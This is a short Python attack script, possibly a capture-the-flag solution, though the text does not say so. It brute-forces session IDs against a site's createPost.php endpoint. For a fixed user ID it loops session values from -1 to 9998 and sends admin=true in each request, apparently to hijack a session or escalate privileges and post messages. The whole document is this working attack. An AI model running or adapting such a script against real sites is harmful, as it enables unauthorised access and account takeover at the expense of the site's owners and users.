import requests


s = requests.session()


def post(userid, sessid):
    url = "http://www.bondogge.com/createPost.php"

    payload = f"sessID={sessid}&userID={userid}&admin=true&message=epic"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    response = s.request("POST", url, data=payload, headers=headers)

    print(response.text)


for i in range(-1, 9999):
    post(24, i)